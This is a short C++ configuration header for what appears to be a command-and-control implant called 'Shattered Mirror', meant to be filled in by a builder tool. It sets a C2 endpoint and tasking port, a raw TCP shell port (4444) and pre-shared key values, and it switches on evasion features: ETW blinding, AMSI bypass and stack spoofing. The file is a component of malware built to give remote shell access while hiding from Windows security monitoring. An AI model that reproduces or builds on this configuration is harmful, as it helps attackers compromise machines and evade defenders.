#pragma once
#include <windows.h>

/* 
 * SHATTERED MIRROR: DYNAMIC CONFIGURATION HEADER
 *
 * This file is automatically modified by the Builder GUI
 * to inject the specific C2 settings and PSK seeds.
 * Do not manually edit unless you are debugging.
 */

namespace Config {
    /* C2 ENDPOINT SETTINGS */
    static const char* C2_DOMAIN  = "127.0.0.1";
    static const int   C2_PORT    = 6969;   // Heartbeat / Tasking 
    static const int   SHELL_PORT = 4444;   // Raw TCP Direct Shell
    
    static const char* PSK_SEED   = "SuperSecretSeedForClient001";
    static const char* PSK_ID     = "YiZZCxy3SLMsIdhN";

    /* EVASION SETTINGS */
    static const bool ENABLE_ETW_BLIND = true;
    static const bool ENABLE_AMSI_BYPASS = true;
    static const bool ENABLE_STACK_SPOOF = true;

    /* DEBUG SETTINGS */
    static const bool ENABLE_DEBUG_CONSOLE = false;
    static const char* LOG_FILE_PATH = "shattered_debug.log";
}
